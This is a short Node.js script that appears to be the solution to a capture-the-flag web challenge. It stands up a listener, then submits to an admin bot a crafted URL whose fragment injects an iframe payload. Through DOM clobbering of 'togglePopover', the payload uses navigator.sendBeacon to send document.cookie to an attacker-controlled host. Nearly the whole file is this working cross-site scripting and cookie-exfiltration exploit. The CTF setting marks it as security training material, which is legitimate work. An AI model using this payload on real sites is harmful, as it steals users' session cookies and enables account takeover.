const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (msecs) => new Promise((resolve) => setTimeout(resolve, msecs));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  fastify.post("/", async (req, reply) => {
    // You got a flag!
    console.log(req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    const url =
      `http://web:3000/#` +
      encodeURIComponent(`
        <iframe
          name="body"
          srcdoc="<a id=togglePopover href=foobar:if(!window.sent)window.sent=navigator.sendBeacon('${ATTACKER_BASE_URL}',document.cookie)></a>"
        ></iframe>
      `);

    await sleep(3 * 1000);
    await reportUrl(url);

    fail("Failed");
  });
};
start();
